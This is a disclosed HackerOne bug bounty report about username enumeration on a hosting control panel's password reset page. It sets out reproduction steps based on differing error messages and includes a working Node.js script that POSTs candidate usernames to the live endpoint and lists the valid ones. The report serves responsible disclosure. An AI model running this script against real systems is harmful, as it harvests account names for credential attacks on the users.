# Enumeration of username on password reset page

## Report Details
- **Report ID**: 806151
- **URL**: https://hackerone.com/reports/806151
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-02-27T12:01:26.930Z
- **Disclosed**: 2020-07-05T05:22:57.706Z

## Reporter
- **Username**: codermak
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: endless_group

## Vulnerability Information
## Summary:
Reset password page api call, can be used to enumerate usernames based on the error message

## Steps To Reproduce:
[add details for how we can reproduce the issue]

    1. Go to password reset page
    2. Enter username and click submit
    3. Check email for password reset code, open the url in any browser
    4. Change the username in url to somewrong username and click on `Request New Password` button you will get error message saying `No user`
    5. Change the username in url to some username which exists other than which is used in step 2, click on `Request New Password` you will get error message saying `No such username in the request list. Your request may have expired.`
    6. Based on this, if a username does not exists, error message `No User` is shown and if username exists `No such username in the request list. Your request may have expired.` error message is shown.
    7. This can be automated with an username list and easily list of valid usernames can be generated


## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

#### PoC

```
const fetch = require('node-fetch');
let usernames = [
  'codermak',
  'codermmak',
  'codermak2',
  'codermak222'
];
let validUsernames = [];

const request = async (input) => {
  const res = await fetch("https://da.theendlessweb.com:2222/CMD_LOST_PASSWORD", {
    "credentials": "include",
    "headers": {
      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:73.0) Gecko/20100101 Firefox/73.0",
      "Accept": "*/*",
      "Accept-Language": "en-US,en;q=0.5",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    "referrer": "https://da.theendlessweb.com:2222/lost-password?username=codermak2&code=test",
    "body": `action=code&username=${input}&code=test&json=yes`,
    "method": "POST",
    "mode": "cors"
  });

  const text = await res.text();
  try {
    const result = JSON.parse(text);
    const errMessage = result.error;
    if (errMessage === 'No such username in the request list.  Your request may have expired.') {
      validUsernames.push(input);
    }
  } catch (err) {

  }
};


const main = async () => {
  for (const username of usernames) {
    await request(username);
  }

  console.log(validUsernames);
}

main();
```

## Impact

Attacker can easily find list of large amount of valid usernames by using some common usernames dictionaries avaialble on internet.

## Attachments
No attachments
